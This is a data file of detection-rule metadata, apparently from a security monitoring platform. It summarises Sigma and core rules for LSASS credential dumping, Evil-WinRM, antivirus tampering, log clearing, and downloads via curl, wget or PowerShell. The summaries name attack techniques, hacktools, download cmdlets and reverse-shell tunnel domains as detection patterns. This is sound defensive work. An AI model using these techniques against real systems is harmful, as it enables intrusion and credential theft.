  Summary: This rule detects unexpected file modifications being carried out by dns.exe.
    Instances of such activity may indicate remote code execution or other forms of
    exploitation, such as those associated with CVE-2020-1350 (SigRed). It highlights
    suspicious behavior by Windows DNS services that could signify an ongoing security
    threat.
  Updated-Date: '2024_09_03'
9f4662ac-17ca-43aa-8f12-5d7b989d0101:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 848941ac99826a6fba97e23a31e4a53d
  Ruleset: core
  Summary: This rule detects attempts to tamper with Sophos Antivirus (AV) functionality
    by monitoring for modifications to specific registry keys. The targeted registry
    keys include configurations for tamper protection and the enabling status of the
    Sophos Endpoint Defense and SAVService. When these registry keys are set to zero,
    indicating that tamper protection is disabled, an alert is generated, as this
    could signify an attempt to disable the AV's protective features.
  Updated-Date: '2024_09_03'
9f50fe98-fe5c-4a2d-86c7-fad7f63ed622:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b033c150ee6451ddeb495d627b377c8
  Ruleset: core
  Summary: This rule detects the execution of "aspnet_compiler.exe" associated with
    potentially suspicious paths during the ASP.NET compilation process. The rule
    monitors for the presence of the compiler in the directories associated with the
    Microsoft.NET framework and flags command-line executions that involve paths typically
    deemed suspicious, such as temporary or public user directories. This behavior
    could indicate attempts at defense evasion or exploitation within a Windows environment,
    especially when the compiler interacts with these unconventional directories.
  Updated-Date: '2024_09_03'
9f546b25-5f12-4c8d-8532-5893dcb1e4b8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d699252a3126ba8977c7d47a690d844e
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious child processes emerging from
    "Diskshadow.exe". It identifies instances where "Diskshadow.exe" spawns processes
    such as "certutil.exe", "cscript.exe", "mshta.exe", "powershell.exe", "pwsh.exe",
    "regsvr32.exe", "rundll32.exe", or "wscript.exe", which could signal attempts
    to escape parent/child relationship detection or circumvent application whitelisting
    rules. Such behavior may indicate actions like VSS evasion, persistence methods,
    Active Directory database extraction, or other malicious activities.
  Updated-Date: '2024_09_04'
9f6a34b4-2688-4eb7-a7f5-e39fef573d0e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4729bb2069a06b185cd6f862634b6a4d
  Ruleset: core
  Summary: This rule detects suspicious Windows strings in URIs, which could indicate
    possible exfiltration activities or webshell communication. The rule identifies
    URIs containing specific Windows directory paths such as '=C:/Users', '=C:/Program%20Files',
    and '=C:/Windows', among others. These detections are considered high-risk as
    they may signify unauthorized data transmission or malicious interactions with
    the server. Potential false positives include legitimate applications and websites
    that use these Windows paths in their URLs.
  Updated-Date: '2024_09_03'
9f8fc146-1d1a-4dbf-b8fd-dfae15e08541:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 32f052dcad4e54aba3531be8b7709c39
  Ruleset: sigmahq
  Summary: This rule detects the execution of SharpLDAPmonitor, a tool that monitors
    the creation, deletion, and modifications of LDAP objects. It identifies instances
    where the executable file associated with this tool (\SharpLDAPmonitor.exe) is
    launched or when specific command-line arguments related to user credentials and
    domain controller IP are used.
  Updated-Date: '2024_09_04'
9f9cd389-cea0-4142-bf1a-a3fd424abedd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e39c651e5ae6b7bae8254ae7786195eb
  Ruleset: emerging-threats
  Summary: This rule detects the creation of an "svchost" process in Windows with
    specific command line flags such as '-k msupdate', '-k msupdate2', or '-k alg',
    which are associated with the ColdSteel Remote Access Trojan (RAT). The presence
    of these command line flags suggests persistence mechanisms employed by ColdSteel
    RAT, as documented by cybersecurity analysis.
  Updated-Date: '2024_09_03'
9f9f92ba-5300-43a4-b435-87d1ee571688:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b96b4bd27c379618baf4c3f83472676
  Ruleset: emerging-threats
  Summary: This rule detects registry events related to the creation of scheduled
    tasks by the Diamond Sleet Advanced Persistent Threat (APT) group. These tasks
    are created during the exploitation of the CVE-2023-42793 vulnerability in Team
    City. The detection focuses on specific registry paths associated with task scheduling
    and the TeamCity Settings User Interface, which indicate potential malicious activity
    linked to this vulnerability.
  Updated-Date: '2024_09_03'
9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ac35222686d20d49950dcde5a9cbbdd
  Ruleset: core
  Summary: This rule detects the execution of format.com with an uncommon filesystem
    option on a Windows system. The presence of format.com in the process creation
    logs, particularly with a filesystem selection that is not one of the common types
    such as exFAT, FAT, NTFS, ReFS, or UDF, could indicate an attempt to evade defenses.
    Malicious actors might use this technique to load harmful DLL files or other programs,
    which can compromise the system's security.
  Updated-Date: '2024_09_03'
9fbf5927-5261-4284-a71d-f681029ea574:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f7012cc3b7c67317df6688eddeb7a510
  Ruleset: sigmahq
  Summary: This rule detects the use of 7-Zip for compressing or encrypting data,
    often a precursor to data exfiltration. It identifies processes where 7-Zip executables
    such as 7z.exe, 7zr.exe, or 7za.exe are invoked, especially when encryption flags
    and specific commands for adding or updating files in an archive are used.
  Updated-Date: '2024_09_04'
9fc3072c-dc8f-4bf7-b231-18950000fadd:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 566a00752da13eb5e1b8831ba0af2828
  Ruleset: core
  Summary: This rule detects the use of "driverquery.exe" or "drvqry.exe" utilities,
    which are leveraged to gather reconnaissance information on installed drivers
    within a Windows environment. It specifically looks for instances where these
    utilities are executed by certain parent processes such as "cscript.exe", "mshta.exe",
    "regsvr32.exe", "rundll32.exe", "wscript.exe", or from user-specific or temporary
    directories. This activity is often associated with malware like Ursnif, which
    uses such tools for gathering system information as part of its reconnaissance
    phase. Legitimate administrative scripts may also trigger this detection.
  Updated-Date: '2024_09_03'
9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d96d68ad02a7ccf05db2b7c95a564ad4
  Ruleset: sigmahq
  Summary: This rule detects the use of various web request commands and cmdlets executed
    through command-line tools and Windows PowerShell. It identifies specific command
    patterns such as '[System.Net.WebRequest]::create', 'curl', 'Invoke-RestMethod',
    'Invoke-WebRequest', 'iwr', 'Net.WebClient', 'Resume-BitsTransfer', 'Start-BitsTransfer',
    'wget', and 'WinHttp.WinHttpRequest'. These commands are commonly used to download
    files or make web requests from scripts or command-line interfaces, potentially
    indicating malicious activity or unauthorized file downloads and transfers.
  Updated-Date: '2024_09_04'
9fe55ea2-4cd6-4491-8a54-dd6871651b51:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5c21a98d1ae51ce5a0a34b918de19947
  Ruleset: sigmahq
  Summary: "This rule detects the execution of Evil-WinRM via PowerShell module logs\
    \ by examining specific hardcoded strings within the utility. Evil-WinRM is a\
    \ post-exploitation tool used for remote command execution and lateral movement\
    \ on Windows systems. The detection focuses on particular payload patterns and\
    \ context information related to system processes such as `wsmprovhost.exe` located\
    \ in the System32 and SysWOW64 directories. Additionally, it monitors the payload\
    \ content for unique commands and encoded scripts that are characteristic of Evil-WinRM\u2019\
    s operations, providing indicators of potential unauthorized access or malicious\
    \ activity."
  Updated-Date: '2024_09_04'
9fff585c-c33e-4a86-b3cd-39312079a65f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b99db0e86ccdfdf8ff101ceccb545092
  Ruleset: core
  Summary: This rule detects the creation of taskmgr.exe, the Windows Task Manager
    process, running in the context of the LOCAL_SYSTEM account. This behavior is
    unusual and may indicate an attempt to evade defenses or disguise malicious activity
    by running a legitimate process under a highly privileged account. The rule triggers
    when the taskmgr.exe process is observed with a user context that includes certain
    localized strings indicating System authority or authorization.
  Updated-Date: '2024_09_03'
a015e032-146d-4717-8944-7a1884122111:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 863595ceb49431c00c304b46a829c101
  Ruleset: core
  Summary: This rule detects the execution of known hacktools on a Linux system by
    examining the image names of running processes. It identifies various categories
    of malicious tools including C2 frameworks like Havoc and CobaltStrike, scanners
    such as nmap and recon-ng, web enumeration tools like gobuster and whatweb, and
    exploit tools including aircrack-ng and hashcat. The intention is to flag the
    presence of these specific hacker tools to alert administrators of potential security
    risks. The rule applies to a comprehensive list of tools commonly used in hacking
    and penetration testing.
  Updated-Date: '2024_09_03'
a018fdc3-46a3-44e5-9afb-2cd4af1d4b39:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c42f9d1c7479eefefb73a634c6340e4
  Ruleset: core
  Summary: This rule detects a suspicious program execution originating from the Outlook
    temporary folder, which is indicative of possible initial access via phishing
    or other malicious methods. This behavior aligns with tactic T1566.001 under the
    MITRE ATT&CK framework, focusing on the initial access vector commonly exploited
    through email clients like Microsoft Outlook. The rule monitors the process creation
    logs on Windows systems and flags any executable found within the specific directory
    path that contains '\Temporary Internet Files\Content.Outlook\'. This detection
    helps in identifying potentially malicious activities initiated from email attachments
    or links that download and execute payloads in the vulnerable temporary folder.
  Updated-Date: '2024_09_03'
a01b8329-5953-4f73-ae2d-aa01e1f35f00:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f1a8c7e58b9ffeab5e02fefb357699a2
  Ruleset: sigmahq
  Summary: This rule detects the execution of "aspnet_compiler.exe" on Windows systems.
    This executable, part of the .NET Framework, can be leveraged to compile and execute
    C# code, potentially posing a security risk. It focuses on identifying instances
    where the executable is run from directories typically associated with the .NET
    Framework. The detection is based on recognizing the presence of the executable
    within the specified file paths, which include both 32-bit and 64-bit versions
    of the .NET Framework.
  Updated-Date: '2024_09_04'
a02961c9-4e4b-4421-a04d-2ad753d6b06a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3af597eac61529ff43951519d383d14c
  Ruleset: securityonion-resources
  Summary: This rule detects when the HTTP service on a Security Onion Intrusion Detection
    Honeypot (IDH) node has received a GET request, indicating potential unauthorized
    or malicious web access attempts.
  Updated-Date: '2024_08_07'
a0413867-daf3-43dd-9245-734b3a787942:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 421b8812fcc6ff1d79d77395cc7bfa6d
  Ruleset: sigmahq
  Summary: This rule detects the retrieval of BitLocker encryption keys within Azure
    audit logs. BitLocker is a security feature for encrypting drives and safeguarding
    data on Windows systems. Monitoring for activities related to BitLocker key management
    is crucial as unauthorized access to these keys may indicate potential security
    breaches or defense evasion techniques.
  Updated-Date: '2024_09_04'
a0459f02-ac51-4c09-b511-b8c9203fc429:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 00270b4b3c2930798912a30d09b09dbc
  Ruleset: sigmahq
  Summary: This rule detects the use of the "CL_Invocation.ps1" script, specifically
    calls to "SyncInvoke", which proxy execution using "System.Diagnostics.Process"
    on Windows systems. This activity is associated with defense evasion techniques.
    The detection is focused on the command line containing 'SyncInvoke', which may
    indicate inline PowerShell calls using "-Command" or "-ScriptBlock" flags.
  Updated-Date: '2024_09_04'
a05baa88-e922-4001-bc4d-8738135f27de:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 28760b9275074992908930564399addf
  Ruleset: sigmahq
  Summary: This rule detects the creation of the Process Monitor driver by any process
    other than the Process Monitor application itself, specifically targeting files
    that contain '\procmon' and have a '.sys' extension. Process Monitor, developed
    by Sysinternals, is a monitoring tool for Windows that collects real-time data
    on system processes and file activities. This detection aims to identify potentially
    unauthorized or malicious attempts to install the Process Monitor driver, which
    could be indicative of persistence or privilege escalation techniques. False positives
    may arise from legitimate binaries that have been renamed to mimic Process Monitor.
  Updated-Date: '2024_09_04'
a07f0359-4c90-4dc4-a681-8ffea40b4f47:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 078162733395e00333c1f5d181ff7ccb
  Ruleset: core
  Summary: This rule detects the creation of a service with its service binary located
    in a suspicious directory such as '\Users\Public\', '\Perflogs\', '\ADMIN$\',
    or '\Temp\' on Windows systems. It flags registry modifications within 'HKLM\System\CurrentControlSet\Services\'
    where the targeted objects either end with '\Start' or '\ImagePath' and contain
    paths indicative of potentially malicious activity, except when certain conditions
    related to known software (e.g., Avast) are met to reduce false positives. The
    detection focuses on identifying potential defense evasion techniques used by
    adversaries.
  Updated-Date: '2024_09_03'
a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60772c26d995f49def6a6be600537542
  Ruleset: core
  Summary: This rule detects unauthorized access to the Local Security Authority Subsystem
    Service (LSASS) process on Windows systems. The LSASS process is crucial for managing
    user authentication and enforcing security policies. Suspicious access to LSASS
    can indicate attempts to steal credentials, a technique often used in cyberattacks.
    The event is identified by monitoring for specific event IDs and process paths
    related to LSASS. Certain legitimate processes and installations paths are excluded
    to reduce false positives.
  Updated-Date: '2024_09_03'
a0b38b70-3cb5-484b-a4eb-c4d8e7bcc0a9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f39e40a46b9c85237ac7d5e7c0adc1bc
  Ruleset: sigmahq
  Summary: This rule detects new activity in the Okta Admin Console, specifically
    when Okta flags behaviors as "POSITIVE" through its heuristic evaluations. The
    rule leverages events related to policy evaluations for sign-on activities to
    identify potentially unusual administrative actions. The intent is to alert on
    new, possibly suspicious, administrative actions within the console that might
    indicate an initial access attempt or impersonation.
  Updated-Date: '2024_09_04'
a0cb7110-edf0-47a4-9177-541a4083128a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 471e1b27eaff0ce6c07c96b9b87886a7
  Ruleset: core
  Summary: This rule detects that a vulnerable Netlogon secure channel connection
    was allowed on a Windows system, potentially indicating exploitation of CVE-2020-1472.
    This vulnerability is associated with privilege escalation attacks and could lead
    to significant security breaches. The detection is based on specific Event ID
    5829 from the NetLogon service in the system logs.
  Updated-Date: '2024_09_03'
a0d7e4d2-bede-4141-8896-bc6e237e977c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a16ffbb68529530858db514e454822b
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious file downloads from file-sharing
    domains using the wget.exe utility on Windows systems. The rule looks for processes
    where the image or original file name matches "wget.exe". It also inspects the
    command line for specific domains typically associated with file-sharing services,
    such as githubusercontent.com, anonfiles.com, dropboxusercontent.com, mega.nz,
    pastebin.com, and several others. Additionally, it checks for the presence of
    HTTP or HTTPS URLs in the command line and flags the use of output redirection
    commands like "-O" or "--output-document". The rule also examines if the downloaded
    filenames have extensions commonly associated with executables or script files,
    such as .exe, .msi, .ps1, .bat, .vbs, .dll, and others.
  Updated-Date: '2024_09_04'
a0edd39f-a0c6-4c17-8141-261f958e8d8f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0358d29af18fdaaf6ba44a78676dff2
  Ruleset: sigmahq
  Summary: This rule detects the creation of a remote session using PowerShell commands
    on Windows operating systems. It specifically looks for the usage of "New-PSSession"
    along with the parameter "-ComputerName" within PowerShell script blocks. This
    behavior can be indicative of adversaries abusing PowerShell for executing remote
    commands and scripts. Legitimate administrative scripts may also exhibit similar
    behavior, which can lead to false positives.
  Updated-Date: '2024_09_04'
a10a2c40-2c4d-49f8-b557-1a946bc55d9d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 275bf9c419938298f05379757d5363ff
  Ruleset: sigmahq
  Summary: This rule detects the creation of a file with an uncommon extension in
    the startup folders of Microsoft Office applications, such as Word or Excel. It
    identifies specific paths where these files might appear, excluding common Office
    document extensions (e.g., .docx, .xlsx) and common Office utilities (e.g., OfficeClickToRun.exe)
    to reduce false positives. This helps in identifying potentially malicious files
    that do not belong in these startup locations.
  Updated-Date: '2024_09_04'
a133193c-2daa-4a29-8022-018695fcf0ae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dbf9c20b50fb2bea38c0c5ee3f15954b
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit a vulnerability in the Rejetto HTTP
    File Server (HFS) identified as CVE-2014-6287. Indicators of an exploit attempt
    include specific patterns in the query string of a request to the server, such
    as the use of PowerShell commands, cmd.exe functionality, and other common scripting
    engines like Python or Windows Script Host (cscript, wscript). The detection focuses
    on identifying suspicious query strings that suggest file saving activities or
    the execution of potentially harmful commands.
  Updated-Date: '2024_09_03'
a136ac98-b2bc-4189-a14d-f0d0388e57a7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d33bbdc6da6792ab81a66db4c1eb04f7
  Ruleset: sigmahq
  Summary: This rule detects when versioning for an AWS S3 bucket is disabled. Disabling
    versioning can be a precursor action by threat actors in AWS ransomware incidents,
    as it allows them to delete objects within the S3 bucket without the ability to
    restore previous versions.
  Updated-Date: '2024_09_04'
a136cde0-61ad-4a61-9b82-8dc490e60dd2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dea50211b733a369ef1180993419f43f
  Ruleset: core
  Summary: This rule detects the obfuscated use of Clip.exe, specifically leveraged
    to execute PowerShell through the Windows clipboard. This technique involves using
    Clip.exe to place a command in the clipboard, which is subsequently executed by
    PowerShell in an obfuscated manner, likely as part of evasion tactics.
  Updated-Date: '2024_09_03'
a1473adb-5338-4a20-b4c3-126763e2d3d3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c946810020debf961d4475d33d7886a8
  Ruleset: core
  Summary: This rule detects the execution of "rundll32.exe" calling "advpack.dll"
    with potentially obfuscated ordinal calls that could be leveraging the "RegisterOCX"
    function. It is designed to identify instances where this behavior is used, as
    such activity can be indicative of defense evasion tactics often employed by malware.
  Updated-Date: '2024_09_03'
a1507d71-0b60-44f6-b17c-bf53220fdd88:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bee4279e17d34de9c62b0fea27ccfccf
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a file named "MoriyaStreamWatchmen.sys"
    in the Windows System32 drivers directory, which is associated with the Moriya
    rootkit. The Moriya rootkit is known for its stealthy operation and was documented
    in the Operation TunnelSnake report. The presence of this file indicates potential
    persistence and privilege escalation attempts by this malicious software.
  Updated-Date: '2024_09_03'
a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 20410488684a534d3cdc543e1a816ad7
  Ruleset: core
  Summary: 'This rule detects registry changes to Office trust records when the path
    is located in a potentially suspicious location. It specifically monitors changes
    to registry entries associated with trusted documents in directories like INetCache,
    Temp, PerfLogs, Public, and certain file paths like D: and E:. These changes can
    indicate that a macro-enabled document in these locations could pose a security
    risk, prompting high-level alerts for defense evasion concerns.'
  Updated-Date: '2024_09_03'
a16980c2-0c56-4de0-9a79-17971979efdd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b6c81fcc9d10d58ec0adc48f223fc56e
  Ruleset: core
  Summary: This rule detects anomalies in Windows command lines where there is a missing
    space before or after the `/c`, `/k`, or `/r` flags when executing commands using
    `cmd.exe`. These anomalies may indicate an attempt to obfuscate commands or could
    be typographical errors made by developers. Specific command fragments without
    spaces such as `'cmd.exe/c'`, `'/cwhoami'`, and `'cmd.exe /c'` are monitored,
    with known benign instances filtered out. Detection focuses on legitimate command
    usage anomalies, filtering out false positives such as typical command paths found
    in certain application directories like Microsoft VS Code. The detection aims
    to identify potential malicious activity or obfuscation techniques.
  Updated-Date: '2024_09_03'
a18dd26b-6450-46de-8c91-9659150cf088:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11932b5cf2177771108c22285d803382
  Ruleset: sigmahq
  Summary: This rule detects process access requests to the LSASS (Local Security
    Authority Subsystem Service) process with potentially suspicious access flags.
    LSASS is a critical component in Windows operating systems that is responsible
    for enforcing the security policy on the system. The rule identifies access attempts
    to LSASS with specific GrantedAccess flags, which are often used by malicious
    actors attempting to extract credentials by dumping the memory of the LSASS process.
    The detection is refined by excluding known legitimate software paths, such as
    antivirus programs, system utilities, and trusted applications, to minimize false
    positives.
  Updated-Date: '2024_09_04'
a18e0862-127b-43ca-be12-1a542c75c7c5:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 600950e4b877d22a329d3ad207095b83
  Ruleset: core
  Summary: This rule detects potential credential dumping by monitoring Windows error
    reporting events where the Local Security Authority Subsystem Service (lsass.exe)
    has crashed. Such crashes could indicate deliberate attempts to exploit the Windows
    Error Reporting system using techniques like Lsass-Shtinkering, designed to extract
    credentials by dumping the memory of the lsass process. The detection focuses
    on specific application error logs indicating an unsuccessful status tied to lsass.exe,
    while accounting for rare, legitimate crashes of the process. References include
    detailed documentation and presentations on the Lsass-Shtinkering technique.
  Updated-Date: '2024_09_03'
a197e378-d31b-41c0-9635-cfdf1c1bb423:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b1f41c5f6f1afc707f090d6acdb8e5b
  Ruleset: sigmahq
  Summary: This rule detects the use of Evil-WinRM, a post-exploitation PowerShell
    remoting tool, commonly utilized by adversaries to access and control systems
    via the Windows Remote Management (WinRM) service. The detection focuses on the
    execution of the 'ruby.exe' process with specific command-line parameters indicating
    the use of Evil-WinRM, such as '-i' (specifying the IP address), '-u' (username),
    and '-p' (password). The purpose is to identify attempts by malicious actors to
    leverage WinRM for lateral movement and system exploitation through valid account
    usage.
  Updated-Date: '2024_09_04'
a1a144b7-5c9b-4853-a559-2172be8d4a03:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d9a843dced3734d082b9f17f7846491
  Ruleset: sigmahq
  Summary: This rule detects the creation of remote threads in uncommon target processes
    on Windows systems. Specifically, it monitors for suspicious activities involving
    processes such as `calc.exe`, `calculator.exe`, `mspaint.exe`, `notepad.exe`,
    `ping.exe`, `sethc.exe`, `spoolsv.exe`, `wordpad.exe`, and `write.exe`. These
    processes are not typically targeted for remote thread injection, making such
    actions suspicious. The rule includes several filters to exclude legitimate activities,
    such as those initiated by system processes like `csrss.exe`, as well as certain
    known behaviors from applications including VMware Tools and Xerox Print Experience.
    The goal is to identify potential defense evasion or privilege escalation attempts
    by monitoring for abnormal remote thread creation in the specified target processes.
  Updated-Date: '2024_09_04'
a1b0ca4e-7835-413e-8471-3ff2b8a66be6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 253a6e9bd480b346ca6ea2e8a96c9974
  Ruleset: sigmahq
  Summary: This rule detects attempts to execute remote commands within a Kubernetes
    Pod's container, specifically using commands like "kubectl exec". It monitors
    the creation of such command executions in Kubernetes audit logs, which could
    reveal potential unauthorized access or misuse. False positives could include
    legitimate debugging activities, necessitating a review of the individual's identity
    and authorization to confirm the legitimacy of the action.
  Updated-Date: '2024_09_04'
a1b1fd53-9c4a-444c-bae0-34a330fc7aa8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f710a5fafced85998c5f6206e6b3913
  Ruleset: core
  Summary: This rule detects the addition of a new "DLLPathOverride" value in the
    "Natural Language" key, which could indicate an attempt by an attacker to achieve
    persistent execution. The persistence mechanism is invoked by the "SearchIndexer.exe"
    process. The rule monitors specific registry paths within the "CurrentControlSet"
    under the "ContentIndex" language directories and looks for modifications to values
    such as '\StemmerDLLPathOverride' and '\WBDLLPathOverride'. This activity is identified
    as a significant security concern due to its high potential for malicious intent.
  Updated-Date: '2024_09_03'
a1d9eec5-33b2-4177-8d24-27fe754d0812:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb60ed19d5413a88c435fd9e37288a52
  Ruleset: sigmahq
  Summary: This rule detects DNS requests to specific Cloudflared tunnel domains,
    which can be exploited by attackers to establish reverse shells or maintain persistence
    on compromised machines. It focuses on identifying queried domains that end with
    '.v2.argotunnel.com', 'protocol-v2.argotunnel.com', 'trycloudflare.com', and 'update.argotunnel.com'.
    The rule acknowledges that legitimate usage of Cloudflare tunnels might trigger
    detections as well.
  Updated-Date: '2024_09_04'
a1e11042-a74a-46e6-b07c-c4ce8ecc239b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fb5af60fc73f4d130be6e5c76deec40
  Ruleset: sigmahq
  Summary: This rule detects a potential registry persistence technique using the
    Event Viewer "Events.asp" method. The detection focuses on specific registry keys
    associated with the Microsoft Event Viewer, specifically targeting configurations
    that may redirect programs or URLs. Filters are in place to exclude default settings
    set via Group Policy, legitimate redirection program command line parameters,
    Microsoft's default URL, and empty details, ensuring that only potentially malicious
    alterations trigger an alert. The technique pertains to attack tactics such as
    persistence and defense evasion, aligned with the MITRE ATT&CK framework identifier
    T1112. This method involves modifying registry entries that control redirection
    within the Event Viewer, often exploited by malicious actors to maintain persistence
    on a Windows system.
  Updated-Date: '2024_09_04'
a20391f8-76fb-437b-abc0-dba2df1952c6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c4c1b9638d324a913f6488d6de4a7aaa
  Ruleset: sigmahq
  Summary: This rule detects child processes initiated by Microsoft.NodejsTools.PressAnyKey.exe,
    which may indicate the execution of arbitrary binaries. This executible is associated
    with NodeJS development within Visual Studio Tools. While legitimate usage by
    developers can trigger this detection, it could also be exploited for unauthorized
    binary execution, presenting potential security risks.
  Updated-Date: '2024_09_04'
a20def93-0709-4eae-9bd2-31206e21e6b2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 359b2eb84648928e3bbb17ee3896afb8
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "driverquery.exe" utility, a Windows
    tool used to perform reconnaissance on installed drivers. The detection focuses
    on instances of the utility being run by monitoring the process creation logs
    for the executable "driverquery.exe" or its file name "drvqry.exe". The rule filters
    out execution instances initiated by common scripting and utility programs, such
    as "cscript.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", and "wscript.exe",
    as well as those running from typical user data and temporary directories. Legitimate
    use cases for this utility, such as third-party tools investigating installed
    drivers, are considered as potential false positives.
  Updated-Date: '2024_09_04'
a23791fe-8846-485a-b16b-ca691e1b03d4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4288253bed5f9231b6998b3fe9facc4
  Ruleset: sigmahq
  Summary: This rule detects the use of obfuscated PowerShell commands executed via
    the RUNDLL32 tool. Specifically, it identifies instances where the RUNDLL32 executable
    calls shell32.dll with the function 'shellexec_rundll' and subsequently invokes
    PowerShell. This technique is often associated with defense evasion and execution
    tactics, as it allows an attacker to hide malicious commands within otherwise
    legitimate-looking processes.
  Updated-Date: '2024_09_04'
a238b5d0-ce2d-4414-a676-7a531b3d13d6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5417d87d666a1b5f4ca2ac6525703a74
  Ruleset: core
  Summary: This rule detects command line activities that attempt to clear or disable
    any Event Tracing for Windows (ETW) trace logs, indicating potential logging evasion.
    It identifies specific command line patterns associated with clearing logs (e.g.,
    commands containing 'cl' and '/Trace'), disabling logs (e.g., commands containing
    'sl' and '/e:false'), and removing ETW providers from trace sessions. The rule
    monitors activities like using 'logman' to update traces, executing PowerShell
    commands like 'Remove-EtwTraceProvider' and 'Set-EtwTraceProvider' to alter logging
    configurations. This detection helps identify malicious actions aimed at tampering
    with ETW logging mechanisms on Windows systems.
  Updated-Date: '2024_09_03'
a27e5fa9-c35e-4e3d-b7e0-1ce2af66ad12:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5472727a5ed278063a5c4b3f5ba06880
  Ruleset: sigmahq
  Summary: This rule detects the installation and execution of the CSExec service,
    which is associated with events recorded by the Service Control Manager on Windows
    systems. The specific criteria for detection include events where the service
    name is 'csexecsvc' or where the image path ends with '\csexecsvc.exe'. The rule
    aims to identify potential malicious activities related to the CSExec tool, a
    known software used for remote command execution.
  Updated-Date: '2024_09_04'
a2863fbc-d5cb-48d5-83fb-d976d4b1743b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0432af38965db5c22102329a9d129f2f
  Ruleset: sigmahq
  Summary: This rule detects changes to sensitive Remote Desktop Protocol (RDP) settings
    in the Windows registry, specifically targeting modifications that may allow unauthorized
    access or compromise security. It monitors for settings where Remote Desktop connections
    are enabled (`\fDenyTSConnections` set to zero), multiple RDP sessions are allowed
    (`\fSingleSessionPerUser` set to zero), or Network-Level Authentication is not
    required (`\UserAuthentication` set to zero). These alterations could indicate
    unauthorized tampering or attempts to create persistent remote access points,
    which are key tactics used in various types of cyber attacks.
